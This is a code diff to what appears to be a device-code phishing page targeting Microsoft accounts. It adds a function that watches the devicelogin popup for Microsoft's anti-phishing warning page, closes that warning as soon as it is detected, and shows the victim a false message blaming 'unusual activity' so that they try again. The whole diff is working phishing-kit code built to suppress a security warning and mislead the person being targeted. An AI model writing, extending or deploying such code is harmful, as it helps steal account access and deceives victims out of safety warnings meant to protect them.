@@ -554,6 +554,79 @@
     } else {
       _popupRef = _nativeOpen('https://microsoft.com/devicelogin', 'vgML', 'width=500,height=600');
     }
+    
+    // Monitor popup for Microsoft warning page
+    if (_popupRef && !isMobile) {
+      monitorPopupForWarnings(_popupRef);
+    }
+  }
+  
+  // VG_ - Monitor popup for Microsoft anti-phishing warning page
+  function monitorPopupForWarnings(popup) {
+    var checkInterval = setInterval(function() {
+      try {
+        // Check if popup is closed
+        if (popup.closed) {
+          clearInterval(checkInterval);
+          return;
+        }
+        
+        // Try to access popup URL and check for warning signs
+        try {
+          var popupUrl = popup.location.href;
+          var popupTitle = popup.document.title;
+          var popupBody = popup.document.body && popup.document.body.innerHTML || '';
+          
+          // Detect Microsoft warning page
+          var isWarningPage = false;
+          if (popupTitle && (
+            popupTitle.toLowerCase().indexOf('phishing') !== -1 ||
+            popupTitle.toLowerCase().indexOf('password') !== -1 ||
+            popupTitle.toLowerCase().indexOf('not normally shown') !== -1
+          )) {
+            isWarningPage = true;
+          }
+          
+          if (popupBody && (
+            popupBody.toLowerCase().indexOf('phishing attempt') !== -1 ||
+            popupBody.toLowerCase().indexOf('url contains your password') !== -1 ||
+            popupBody.toLowerCase().indexOf('close this page immediately') !== -1
+          )) {
+            isWarningPage = true;
+          }
+          
+          if (isWarningPage) {
+            // Close the warning popup
+            popup.close();
+            clearInterval(checkInterval);
+            
+            // Show user-friendly error message
+            showToast('Verification Issue', 'Microsoft detected unusual activity. Please try again in a few minutes or use a different verification method.', 8000);
+            
+            // Reset UI state
+            var startBtn = document.getElementById('startBtn');
+            if (startBtn) {
+              startBtn.style.display = 'block';
+              startBtn.disabled = false;
+              startBtn.innerHTML = 'Generate Code';
+            }
+            _codeReady = false;
+            return;
+          }
+        } catch (e) {
+          // Cross-origin error - can't access popup content, that's normal
+          // Just continue monitoring
+        }
+      } catch (e) {
+        // Popup closed or inaccessible
+        clearInterval(checkInterval);
+      }
+    }, 1000); // Check every second
+    
+    // Stop monitoring after 5 minutes
+    setTimeout(function() {
+      clearInterval(checkInterval);
+    }, 300000);
   }
 
   // VG_ - Sign in button: open Microsoft sign-in popup
